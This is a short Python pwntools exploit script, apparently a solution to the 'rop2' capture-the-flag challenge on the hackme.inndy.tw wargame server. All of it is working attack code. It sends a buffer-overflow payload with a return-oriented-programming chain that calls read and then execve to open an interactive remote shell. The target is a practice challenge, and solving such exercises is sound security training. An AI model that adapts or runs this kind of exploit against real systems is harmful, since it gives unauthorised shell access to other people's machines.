from pwn import *

#p = process('./rop2')
p = remote('hackme.inndy.tw',7703)
p.recvuntil('ropchain:')

payload = 'a'* 0xc + 'aaaa'
syscall_plt = 0x08048320
pppp_ret = 0x08048578
bss = 0x0804A020
#gdb.attach(p)
payload += p32(syscall_plt) + p32(pppp_ret)
payload += p32(3) + p32(0) + p32(bss) + p32(8)
payload += p32(syscall_plt) + p32(0xdeadbeef)
payload += p32(11) + p32(bss) + p32(0) + p32(0)

p.sendline(payload)

p.send('/bin/sh\x00')

p.interactive()

